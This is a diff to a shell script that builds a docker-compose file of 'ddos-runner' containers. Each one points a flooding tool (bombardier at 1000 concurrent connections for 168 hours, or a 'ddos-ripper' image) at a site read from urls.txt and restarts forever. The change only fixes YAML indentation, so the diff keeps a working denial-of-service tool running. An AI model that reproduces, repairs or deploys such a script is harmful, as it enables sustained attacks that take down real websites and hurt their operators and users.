@@ -35,9 +35,9 @@ generate_compose_light () {
   while read -r site_url; do
     if [ ! -z $site_url ]; then
       echo "  ddos-runner-$counter:" >> docker-compose.yml
-      echo "  image: alpine/bombardier:latest" >> docker-compose.yml
-      echo "  restart: always" >> docker-compose.yml
-      echo "  command: -c 1000 -d 168h $site_url" >> docker-compose.yml
+      echo "    image: alpine/bombardier:latest" >> docker-compose.yml
+      echo "    restart: always" >> docker-compose.yml
+      echo "    command: -c 1000 -d 168h $site_url" >> docker-compose.yml
       ((counter=counter+1))
     fi
   done < urls.txt
@@ -50,9 +50,9 @@ generate_compose () {
   while read -r site_url; do
     if [ ! -z $site_url ]; then
         echo "  ddos-runner-$counter:" >> docker-compose.yml
-        echo "  image: nitupkcuf/ddos-ripper:latest" >> docker-compose.yml
-        echo "  restart: always" >> docker-compose.yml
-        echo "  command: $site_url" >> docker-compose.yml
+        echo "    image: nitupkcuf/ddos-ripper:latest" >> docker-compose.yml
+        echo "    restart: always" >> docker-compose.yml
+        echo "    command: $site_url" >> docker-compose.yml
         ((counter=counter+1))
     fi
   done < urls.txt
